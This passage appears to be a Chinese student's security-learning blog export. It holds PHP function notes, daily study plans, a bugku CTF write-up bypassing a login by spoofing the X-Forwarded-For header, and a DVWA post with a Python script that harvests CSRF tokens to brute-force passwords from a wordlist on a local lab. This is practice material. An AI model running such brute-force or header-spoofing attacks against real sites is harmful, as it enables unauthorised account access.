    <title>php查询函数整理</title>
    <url>/2020/02/22/php%E6%9F%A5%E8%AF%A2%E5%87%BD%E6%95%B0%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<h3 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">substr(string,start,length)</span><br></pre></td></tr></table></figure>

<ul>
<li>string:被搜索的字符串【必须】</li>
<li>start:(数字)开始的位置 【必须】</li>
<li>length:搜索的长度【可选】</li>
</ul>
<p>返回字符串的提取部分，如果失败则返回 FALSE，或者返回一个空字符串。</p>
<p><a href="http://albatross-g.site/2020/02/01/php-substr-%E5%87%BD%E6%95%B0-%E8%BF%94%E5%9B%9E%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E4%B8%80%E9%83%A8%E5%88%86/#%E8%AF%AD%E6%B3%95" target="_blank" rel="noopener">详细</a></p>
<h3 id="stristr-不区分大小写"><a href="#stristr-不区分大小写" class="headerlink" title="stristr(不区分大小写)"></a>stristr(不区分大小写)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stristr(string,search,before_search)</span><br></pre></td></tr></table></figure>

<ul>
<li>string:被搜索的字符串【必须】</li>
<li>search:所搜索的字符串【必须】</li>
<li>before_search:设置布尔值：true则返回搜索前的字符串（以搜索的第一个字符为准）【可选】</li>
</ul>
<p>返回字符串的剩余部分（从匹配点）。如果未找到所搜索的字符串，则返回 FALSE。</p>
<blockquote>
<p>要区分大小写用 ： strstr()</p>
</blockquote>
<h3 id="str-replace（区分大小写）"><a href="#str-replace（区分大小写）" class="headerlink" title="str_replace（区分大小写）"></a>str_replace（区分大小写）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str_replace(find,replace,string,count)</span><br></pre></td></tr></table></figure>

<ul>
<li>find：所搜索的值【必须】</li>
<li>replace：替换的值【必须】</li>
<li>string：被搜索的值【必须】</li>
<li>count：对替换的值进行计数【可选】</li>
</ul>
<p>返回带有替换值的字符串或数组。</p>
<blockquote>
<p>如要对大小写不敏感则用 ：str_ireplace（）</p>
</blockquote>
<h3 id="stripos（不区分大小写）"><a href="#stripos（不区分大小写）" class="headerlink" title="stripos（不区分大小写）"></a>stripos（不区分大小写）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stripos(string,find,start)</span><br></pre></td></tr></table></figure>

<ul>
<li>string:被搜索的字符串【必须】</li>
<li>start:(数字)开始的位置 【必须】</li>
<li>start:规定开始搜索的位置【可选】</li>
</ul>
<p>返回字符串在另一字符串中<strong>第一次</strong>出现的位置，如果没有找到字符串则返回 FALSE。<strong>注释：</strong>字符串位置从 0 开始，不是从 1 开始。</p>
<ul>
<li><a href="https://www.runoob.com/php/func-string-strripos.html" target="_blank" rel="noopener">strripos()</a> - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</li>
<li><a href="https://www.runoob.com/php/func-string-strpos.html" target="_blank" rel="noopener">strpos()</a> - 查找字符串在另一字符串中第一次出现的位置（区分大小写）</li>
<li><a href="https://www.runoob.com/php/func-string-strrpos.html" target="_blank" rel="noopener">strrpos()</a> - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）</li>
</ul>
<p>以strpos为底，不区分大小写加i，最后一次出现加r</p>
]]></content>
      <categories>
        <category>php 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-02-23日目标</title>
    <url>/2020/02/22/2020-02-23%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-23日目标"><a href="#2020-02-23日目标" class="headerlink" title="2020-02-23日目标"></a>2020-02-23日目标</h2><table>
<thead>
<tr>
<th>7：30</th>
<th>起床</th>
</tr>
</thead>
<tbody><tr>
<td>8：00-9：00</td>
<td>英语</td>
</tr>
<tr>
<td>9：30-10：45</td>
<td>DVWA Weak Session IDs</td>
</tr>
<tr>
<td>11：00-12：00</td>
<td>sql书</td>
</tr>
<tr>
<td>14：00-15：30</td>
<td>c语言</td>
</tr>
<tr>
<td>15：45-17：00</td>
<td>DVWA (CSP) Bypass</td>
</tr>
<tr>
<td>19：00-20：00</td>
<td>数学</td>
</tr>
<tr>
<td>20：15-21：30</td>
<td>刷题</td>
</tr>
<tr>
<td></td>
<td>睡觉</td>
</tr>
</tbody></table>
<h2 id="2020-02-22总结"><a href="#2020-02-22总结" class="headerlink" title="2020-02-22总结"></a>2020-02-22总结</h2><ol>
<li>了解了DVWA upload的方法，可是中国菜刀怎么都连不上，心态有点崩</li>
<li>整理了php查询函数</li>
<li>预习了高数第一单元第一节</li>
<li>Dvwa insecure  CAPTCHA</li>
<li>看了教学视频，大致了解了c语言指针</li>
<li>读了sql第二章第一部分</li>
<li></li>
</ol>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-02-22日目标</title>
    <url>/2020/02/21/2020-02-22%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-22日目标"><a href="#2020-02-22日目标" class="headerlink" title="2020-02-22日目标"></a>2020-02-22日目标</h2><table>
<thead>
<tr>
<th>7：30</th>
<th>起床</th>
</tr>
</thead>
<tbody><tr>
<td>8：00-9：00</td>
<td>英语</td>
</tr>
<tr>
<td>9：30-10：30</td>
<td>file upload</td>
</tr>
<tr>
<td>10：45-12：00</td>
<td>预习高数</td>
</tr>
<tr>
<td>14：00-15：15</td>
<td>Insecure CAPTCHA</td>
</tr>
<tr>
<td>15：30-17：00</td>
<td>C语言指针</td>
</tr>
<tr>
<td>19：00-20：00</td>
<td>sql书</td>
</tr>
<tr>
<td>20：15-…</td>
<td>刷刷题，整理整理</td>
</tr>
<tr>
<td>24：00</td>
<td>上床</td>
</tr>
</tbody></table>
<h2 id="2020-02-21总结"><a href="#2020-02-21总结" class="headerlink" title="2020-02-21总结"></a>2020-02-21总结</h2><ol>
<li>浏览了sql的第一单元</li>
<li>完成了DVWA file inclusion</li>
<li>下了个DEV-C++（我比较菜暂时用不惯vs2017）</li>
<li>看了了解了c语言指针</li>
<li>做了DVWA file upload部分</li>
</ol>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>bugku管理员系统</title>
    <url>/2020/02/20/bugku%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<p>任意输入用户名密码：</p>
<p><img src="/2020/02/20/bugku%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F/7.png" alt="7"></p>
<p>想到伪造IP地址的http头：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP </p>
</blockquote>
<p>改一下头，然后在源代码找到个base64一解密是管理员的密码</p>
<p>成功。</p>
]]></content>
      <tags>
        <tag>http</tag>
        <tag>抓包</tag>
      </tags>
  </entry>
  <entry>
    <title>用脚本破解dvwa的brute—-force</title>
    <url>/2020/02/20/%E7%94%A8%E8%84%9A%E6%9C%AC%E7%A0%B4%E8%A7%A3dvwa%E7%9A%84brute%E2%80%94-force/</url>
    <content><![CDATA[<p>先来看看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Brute Force Source</span><br><span class="line">vulnerabilities/brute/source/high.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Login'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    $user = $_GET[ <span class="string">'username'</span> ];</span><br><span class="line">    $user = stripslashes( $user );</span><br><span class="line">    $user = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $user ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_GET[ <span class="string">'password'</span> ];</span><br><span class="line">    $pass = stripslashes( $pass );</span><br><span class="line">    $pass = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $row    = mysqli_fetch_assoc( $result );</span><br><span class="line">        $avatar = $row[<span class="string">"avatar"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得出两点结论：</p>
<ol>
<li>因为mysqli_real_escape_string的存在，无法使用sql注入</li>
<li>因为每次对token的验证，无法直接使用burpsuite暴力破解</li>
</ol>
<p>于是想到自己用python写脚本，可是我不会，怎么办呢，先来研究下别人的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">header=&#123;<span class="string">'Host'</span>:<span class="string">'127.0.0.1'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">'Accept'</span>:<span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">'Accept-Language'</span>:<span class="string">'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">'Referer'</span>:<span class="string">'http://127.0.0.1/vulnerabilities/brute/'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">'cookie'</span>:<span class="string">'PHPSESSID=8p4kb7jc1df431lo6qe249quv2; security=high'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">'Connection'</span>:<span class="string">'close'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">'Upgrade-Insecure-Requests'</span>:<span class="string">'1'</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">requrl=<span class="string">"http://127.0.0.1/vulnerabilities/brute/"</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span><span class="params">(requrl,header)</span>:</span></span><br><span class="line"></span><br><span class="line">    response=requests.get(url=requrl,headers=header)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> (response.status_code,len(response.content))</span><br><span class="line"></span><br><span class="line">    soup=BeautifulSoup(response.text,<span class="string">"html.parser"</span>)</span><br><span class="line"></span><br><span class="line">    input=soup.form.select(<span class="string">"input[type='hidden']"</span>)   <span class="comment">#返回的是一个list列表</span></span><br><span class="line"></span><br><span class="line">    user_token=input[<span class="number">0</span>][<span class="string">'value'</span>]                   <span class="comment">#获取用户的token</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> user_token</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">user_token=get_token(requrl,header)</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> open(<span class="string">"E:\Password\mima.txt"</span>):</span><br><span class="line"></span><br><span class="line">    requrl=<span class="string">"http://127.0.0.1/vulnerabilities/brute/?username=admin&amp;password="</span>+line.strip()+<span class="string">"&amp;Login=Login&amp;user_token="</span>+user_token</span><br><span class="line"></span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> (i , <span class="string">'admin'</span> ,line.strip(),end=<span class="string">"  "</span>)</span><br><span class="line"></span><br><span class="line">    user_token=get_token(requrl,header)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">20</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>



<h2 id="import-requests"><a href="#import-requests" class="headerlink" title="import requests"></a>import requests</h2><p><a href="https://www.cnblogs.com/lanyinhao/p/9634742.html" target="_blank" rel="noopener">参考文章</a></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">r1 = requests.get(url=<span class="string">'url'</span>, params=&#123;<span class="string">'wd'</span>: <span class="string">'python'</span>&#125;)</span><br><span class="line">print(r1.url)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; url?wd=python</span><br></pre></td></tr></table></figure>

<p><strong>params为可选项</strong></p>
<h3 id="几种方法"><a href="#几种方法" class="headerlink" title="几种方法"></a>几种方法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1   requests.get(‘https:&#x2F;&#x2F;github.com&#x2F;timeline.json’)                         # GET请求</span><br><span class="line">2   requests.post(“http:&#x2F;&#x2F;httpbin.org&#x2F;post”)                                 # POST请求</span><br><span class="line">3   requests.put(“http:&#x2F;&#x2F;httpbin.org&#x2F;put”)                                   # PUT请求</span><br><span class="line">4   requests.delete(“http:&#x2F;&#x2F;httpbin.org&#x2F;delete”)                             # DELETE请求</span><br><span class="line">5   requests.head(“http:&#x2F;&#x2F;httpbin.org&#x2F;get”)                                  # HEAD请求</span><br><span class="line">6   requests.options(“http:&#x2F;&#x2F;httpbin.org&#x2F;get” )                              # OPTIONS请求</span><br></pre></td></tr></table></figure>

<h3 id="响应的内容"><a href="#响应的内容" class="headerlink" title="响应的内容"></a>响应的内容</h3><ul>
<li><p>r.encoding                           #获取当前的编码</p>
</li>
<li><p>r.encoding = ‘utf-8’             #设置编码</p>
</li>
<li><p>r.text                                     #以encoding解析返回内容。字符串方式的响应体，会自动根据响应头部的字符编码进行解码。</p>
</li>
<li><p>r.content                              #以字节形式（二进制）返回。字节方式的响应体，会自动为你解码 gzip 和 deflate 压缩。</p>
</li>
<li><p>r.cookie                                #返回cookie</p>
</li>
<li><p>r.headers                             #以字典对象存储服务器响应头，但是这个字典比较特殊，字典键不区分大小写，若键不存在则返回None</p>
</li>
<li><p>r.status_code                      #响应状态码</p>
</li>
<li><p>r.raw                                    #返回原始响应体，也就是 urllib 的 response 对象，使用 r.raw.read()   </p>
</li>
<li><p>r.ok                                      # 查看r.ok的布尔值便可以知道是否登陆成功</p>
</li>
</ul>
<p>   #<em>特殊方法</em>#</p>
<ul>
<li><p>r.json()                                #Requests中内置的JSON解码器，以json形式返回,前提返回的内容确保是json格式的，不然解析出错会抛异常</p>
</li>
<li><p>r.raise_for_status()            #失败请求(非200响应)抛出异常</p>
</li>
</ul>
<p><img src="/2020/02/20/%E7%94%A8%E8%84%9A%E6%9C%AC%E7%A0%B4%E8%A7%A3dvwa%E7%9A%84brute%E2%80%94-force/1.png" alt="1"></p>
<h3 id="定制头和cookie信息"><a href="#定制头和cookie信息" class="headerlink" title="定制头和cookie信息"></a>定制头和cookie信息</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">header = &#123;<span class="string">'user-agent'</span>: <span class="string">'my-app/0.0.1'</span><span class="string">'&#125; </span></span><br><span class="line"><span class="string">cookie = &#123;'</span>key<span class="string">':'</span>value<span class="string">'&#125; </span></span><br><span class="line"><span class="string">r = requests.get/post('</span>your url<span class="string">',headers=header,cookies=cookie)</span></span><br></pre></td></tr></table></figure>







<h2 id="BeautifulSoup"><a href="#BeautifulSoup" class="headerlink" title="BeautifulSoup"></a>BeautifulSoup</h2><p><a href="https://www.cnblogs.com/scios/p/8652760.html" target="_blank" rel="noopener">参考文章</a></p>
<p>页面的源代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"#"</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line">			Username:<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">			Password:<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">AUTOCOMPLETE</span>=<span class="string">"off"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Login"</span> <span class="attr">name</span>=<span class="string">"Login"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'user_token'</span> <span class="attr">value</span>=<span class="string">'0871b3a033e5e832172e1c0931b3fc95'</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">soup &#x3D; BeautifulSoup(html_doc, &#39;html.parser&#39;, from_encoding&#x3D;&#39;utf-8&#39;)</span><br></pre></td></tr></table></figure>



<p>而对于脚本里的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">input&#x3D;soup.form.select(&quot;input[type&#x3D;&#39;hidden&#39;]&quot;)</span><br></pre></td></tr></table></figure>

<p>大致意思是，在form标签里寻找input标签，而这个input标签的type要是hidden</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user_token&#x3D;input[0][&#39;value&#39;]</span><br></pre></td></tr></table></figure>

<p>然后获取这个input标签里的第一个value（即token）</p>
<p><strong>当然，还有其他获取方法：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user_token &#x3D; soup.find_all(&#39;input&#39;)[3].get(&#39;value&#39;)</span><br><span class="line">user_token &#x3D; soup.form.input.input.input.input[&quot;value&quot;]</span><br></pre></td></tr></table></figure>

<p>都代表找到第四个input</p>
<h2 id="end-“-”"><a href="#end-“-”" class="headerlink" title="end=“  ”"></a>end=“  ”</h2><p>在python中，print里最后加上end=“  ”，可以起到不换行效果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print (i , &#39;admin&#39; ,line.strip(),end&#x3D;&quot;  &quot;)</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-02-21日目标</title>
    <url>/2020/02/20/2020-02-21%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-21目标"><a href="#2020-02-21目标" class="headerlink" title="2020-02-21目标"></a>2020-02-21目标</h2><table>
<thead>
<tr>
<th>8：00</th>
<th>起床</th>
</tr>
</thead>
<tbody><tr>
<td>8：00-9：00</td>
<td>英语听力加朗读</td>
</tr>
<tr>
<td>9：30-10：30</td>
<td>sqli-lab 11-12【阳光好看书】</td>
</tr>
<tr>
<td>10：45-12：00</td>
<td>预习高数</td>
</tr>
<tr>
<td>14：00-15：00</td>
<td>DVWA file inclusion</td>
</tr>
<tr>
<td>15：15-17：00</td>
<td>沉迷c语言</td>
</tr>
<tr>
<td>19：00-20：00</td>
<td>DVWA file upload</td>
</tr>
<tr>
<td>20：15-21：30</td>
<td>刷刷题</td>
</tr>
<tr>
<td>21：30-0：00</td>
<td>看看书放松放松</td>
</tr>
<tr>
<td></td>
<td>上床</td>
</tr>
</tbody></table>
<h2 id="2020-02-20总结"><a href="#2020-02-20总结" class="headerlink" title="2020-02-20总结"></a>2020-02-20总结</h2><ol>
<li>整理了php过滤函数</li>
<li>dvwa的xss（Reflected）</li>
<li>dvwa的xss（Stored）</li>
<li>装好了gcc【今日最大收获】</li>
<li>用最简单的方法基本解决了c任务</li>
<li>解决了brute force的high难度并整理了脚本</li>
<li>写了脚本解决了bugku的post</li>
<li>做了bugku的web4和输入密码</li>
</ol>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>php常见的过滤函数</title>
    <url>/2020/02/20/php%E5%B8%B8%E8%A7%81%E7%9A%84%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h3 id><a href="#" class="headerlink" title></a></h3><h3 id="trim"><a href="#trim" class="headerlink" title="trim()"></a>trim()</h3><p>trim函数移除字符串两侧的空白字符或其他预定义字符.</p>
<h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">trim(string,charlist)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>string</em></td>
<td>必需。规定要检查的字符串。</td>
</tr>
<tr>
<td><em>charlist</em></td>
<td>可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：”\0” - NULL     “\t” - 制表符     “\n” - 换行      “\x0B” - 垂直制表符     “\r” - 回车     “ “ - 空格</td>
</tr>
</tbody></table>
<h4 id="类似"><a href="#类似" class="headerlink" title="类似"></a>类似</h4><ol>
<li>ltrim() - 移除字符串左侧的空白字符或其他预定义字符。</li>
<li>rtrim() - 移除字符串右侧的空白字符或其他预定义字符。</li>
</ol>
<h3 id="mysqli-real-escape-string"><a href="#mysqli-real-escape-string" class="headerlink" title="mysqli_real_escape_string()"></a>mysqli_real_escape_string()</h3><p>mysqli_real_escape_string对字符串特殊符号（\x00，\n，\r，\，‘，“，\x1a）等进行转义，转义成sql语句。</p>
<h4 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysqli_real_escape_string(connection,escapestring);</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>connection</em></td>
<td>必需。规定要使用的 MySQL 连接。</td>
</tr>
<tr>
<td><em>escapestring</em></td>
<td>必需。要转义的字符串。编码的字符是 NUL（ASCII 0）、\n、\r、\、’、” 和 Control-Z。</td>
</tr>
</tbody></table>
<h3 id="stripslashes-string-："><a href="#stripslashes-string-：" class="headerlink" title="stripslashes(string)："></a>stripslashes(string)：</h3><p>去除掉string字符的反斜杠＼</p>
<h3 id="addslashes-string-："><a href="#addslashes-string-：" class="headerlink" title="addslashes(string)："></a>addslashes(string)：</h3><p> addslashes() 函数返回在预定义的字符前添加反斜杠的字符串。</p>
<p>预定义字符是：</p>
<ul>
<li>单引号（’）</li>
<li>双引号（”）</li>
<li>反斜杠（\）</li>
<li>NULL</li>
</ul>
<h3 id="strip-tags"><a href="#strip-tags" class="headerlink" title="strip_tags()"></a>strip_tags()</h3><p>strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签。</p>
<h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strip_tags(string,allow)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>string</em></td>
<td>必需。规定要检查的字符串。</td>
</tr>
<tr>
<td><em>allow</em></td>
<td>可选。规定允许的标签。这些标签不会被删除。</td>
</tr>
</tbody></table>
<h3 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars()"></a>htmlspecialchars()</h3><p>在php中，htmlspecialchars()函数是使用来把一些预定义的字符转换为HTML实体，返回转换后的新字符串，原字符串不变。</p>
<p><strong>被转换的预定义的字符有：</strong></p>
<p>&amp;：转换为&amp;</p>
<p>“：转换为&quot;</p>
<p>‘：转换为成为 ‘</p>
<p>&lt;：转换为&lt;</p>
<h5 id="gt-：转换为-gt"><a href="#gt-：转换为-gt" class="headerlink" title="&gt;：转换为&gt;"></a>&gt;：转换为&gt;</h5><h3 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">htmlspecialchars(string,flags,character-set,double_encode)</span><br></pre></td></tr></table></figure>

<p>具体参数解释见 <a href="https://www.runoob.com/php/func-string-htmlspecialchars.html" target="_blank" rel="noopener">菜鸟教程</a></p>
<h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h3><p>函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] &#x3D;&gt; 290</span><br><span class="line">    [1] &#x3D;&gt; 69</span><br><span class="line">    [2] &#x3D;&gt; 3</span><br><span class="line">    [3] &#x3D;&gt; width&#x3D;&quot;290&quot; height&#x3D;&quot;69&quot;</span><br><span class="line">    [bits] &#x3D;&gt; 8</span><br><span class="line">    [mime] &#x3D;&gt; image&#x2F;png</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>返回结果说明</p>
<ul>
<li>索引 0 给出的是图像宽度的像素值</li>
<li>索引 1 给出的是图像高度的像素值</li>
<li>索引 2 给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM</li>
<li>索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 <image> 标签</image></li>
<li>索引 bits 给出的是图像的每种颜色的位数，二进制格式</li>
<li>索引 channels 给出的是图像的通道值，RGB 图像默认是 3</li>
<li>索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如： header(“Content-type: image/jpeg”);</li>
</ul>
]]></content>
      <categories>
        <category>php 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-02-20日目标</title>
    <url>/2020/02/19/2020-02-20%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-18日目标"><a href="#2020-02-18日目标" class="headerlink" title="2020-02-18日目标"></a>2020-02-18日目标</h2><table>
<thead>
<tr>
<th>8：00</th>
<th>起床</th>
</tr>
</thead>
<tbody><tr>
